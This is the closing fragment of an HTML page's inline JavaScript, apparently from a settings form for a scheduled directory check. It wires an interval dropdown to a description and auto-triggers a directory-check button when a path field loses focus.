        // Initialize interval description
        updateIntervalDescription(300); // Default 5 minutes
        
        // Listen for interval selection changes
        document.getElementById('interval').addEventListener('change', function() {
            updateIntervalDescription(this.value);
        });
        
        // Auto-check directory on blur if path looks complete
        dirInput.addEventListener('blur', function() {
            if (this.value && this.value.length > 3 && this.value.includes('/')) {
                // Trigger check if path looks valid
                document.getElementById('btn-check-dir').click();
            }
        });
    </script>
</body>
</html>